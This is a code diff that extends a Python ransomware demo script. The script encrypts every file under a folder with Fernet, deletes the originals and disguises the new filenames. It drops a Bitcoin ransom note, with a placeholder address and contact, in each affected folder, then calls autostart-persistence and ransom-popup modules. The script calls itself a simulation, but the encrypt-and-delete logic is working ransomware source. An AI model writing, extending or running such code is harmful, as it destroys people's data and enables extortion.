@@ -1,37 +1,55 @@
 from cryptography.fernet import Fernet
-import os, glob
+import os
+from ransomware_gui import show_ransom_gui  # GUI popup
+from persistence import setup_autostart      # Autostart simulation
 
-# Create and store encryption key
+# List to hold file paths
+files_to_encrypt = []
+
+# Traverse the 'demo_files' directory to find files
+for root, dirs, files in os.walk("demo_files"):
+    for file in files:
+        filepath = os.path.join(root, file)
+        if filepath.endswith("key.key") or file.endswith(".enc") or file.endswith("README.txt"):
+            continue
+        files_to_encrypt.append(filepath)
+
+# Generate and save the encryption key
 key = Fernet.generate_key()
-with open("key.key", "wb") as f:
-    f.write(key)
+with open("key.key", "wb") as key_file:
+    key_file.write(key)
 
+# Initialize Fernet
 fernet = Fernet(key)
 
-# Folder containing files to simulate encryption
-folder = "demo_files/"
-os.makedirs(folder, exist_ok=True)
+# Encrypt files and simulate extension hiding
+for file in files_to_encrypt:
+    with open(file, "rb") as f:
+        content = f.read()
+    encrypted_content = fernet.encrypt(content)
 
-# Encrypt all files in folder
-for filepath in glob.glob(folder + "*"):
-    if filepath.endswith(".enc") or filepath.endswith("README.txt"):
-        continue
-    with open(filepath, "rb") as f:
-        data = f.read()
-    encrypted = fernet.encrypt(data)
-    with open(filepath + ".enc", "wb") as f:
-        f.write(encrypted)
-    os.remove(filepath)
+    # Simulate extension hiding: original.txt -> original .txt
+    base, ext = os.path.splitext(file)
+    disguised_name = base + " " + ext  # e.g., report.txt -> report .txt
 
-# Drop ransom note
-ransom_note = """
---- YOUR FILES HAVE BEEN ENCRYPTED ---
-To recover your data, send 1 BTC to the following address:
-1A2b3C4d5E6f7G8h9I0j
-Then contact us with proof of payment.
-You have 48 hours before your files are lost forever."""
+    with open(disguised_name, "wb") as f:
+        f.write(encrypted_content)
 
-with open(folder + "README.txt", "w") as f:
-    f.write(ransom_note)
+    os.remove(file)  # Delete the original file
 
-print("[+] Files encrypted. Ransom note dropped.")
+# Write ransom note in each folder
+for file in files_to_encrypt:
+    ransom_note_path = os.path.join(os.path.dirname(file), "ransom_note.txt")
+    with open(ransom_note_path, "w") as note:
+        note.write(
+            "---YOUR FILES HAVE BEEN ENCRYPTED!\n"
+            "To recover your data, send 1 BTC to the following address: 1A2b3C4d5E6f7G8h9I0j\n"
+            "After payment, contact us at unlock@ransom.fake\n"
+            "You have 48 hours before your files are lost forever."
+        )
+
+# Simulate persistence by creating autostart entry
+setup_autostart()
+
+# Show the ransom GUI popup
+show_ransom_gui()
